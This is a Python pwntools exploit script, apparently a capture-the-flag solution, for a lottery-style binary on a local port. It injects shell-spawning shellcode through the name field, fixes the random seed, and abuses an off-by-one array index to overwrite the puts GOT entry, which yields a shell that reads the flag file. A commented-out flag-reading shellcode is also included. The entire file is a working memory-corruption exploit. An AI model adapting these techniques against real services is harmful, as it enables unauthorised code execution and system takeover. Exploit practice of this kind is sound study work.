from pwn import *


context.arch = 'amd64'

# seed(0x30303030)

"""
shellcode = asm(
    shellcraft.open('/home/orw/flag') +
    shellcraft.read('rax', 'rsp', 0x40) +
    shellcraft.write(1, 'rsp', 0x40)
)
"""

shellcode = asm(
    shellcraft.sh()
)
conn = remote('localhost', 10172)

target = [0, 0x6020f0 + 0x20] # puts@GOT to target
puts_got_offset = -44 # relative to guess[]
payload = b'0' * 0x20 + shellcode # sets seed(0x30303030) and inject shellcode
lottery_nums = [17, 54, 86, 73, 74, 70]
lottery_nums = [a - 1 for a in lottery_nums] # off by one

#with open('./input.data', 'wb') as f:
#    f.write(payload)
#print(f"[+] Payloads written to input.data")

conn.sendlineafter(b'name: ', payload)
conn.sendlineafter(b'age: ', b'100')
for i in range(2):
    print(f"Modifying guess[{puts_got_offset+i}]...")
    for j in range(6):
        sleep(0.2)
        lottery_str = f'Chose the number {j}: '
        print(f"{lottery_str} {lottery_nums[j]}")
        conn.sendlineafter(lottery_str.encode(), str(lottery_nums[j] + i).encode()) # off by one first time, correct second time and calls puts, boom
    conn.sendlineafter(b'Change the number? [1:yes 0:no]: ', b'1')
    conn.sendlineafter(b'Which number [1 ~ 6]: ', str(puts_got_offset + i + 1).encode()) # Mofify GOT entry, +1 because they decrement it
    got_str = f'Chose the number {puts_got_offset+i}: '
    conn.sendlineafter(got_str.encode(), str(target[i]).encode()) # new address
    print(f"  guess[{puts_got_offset+i}] modified to {hex(target[i])}")

conn.sendline(b'cat /home/$(whoami)/flag')
conn.interactive()

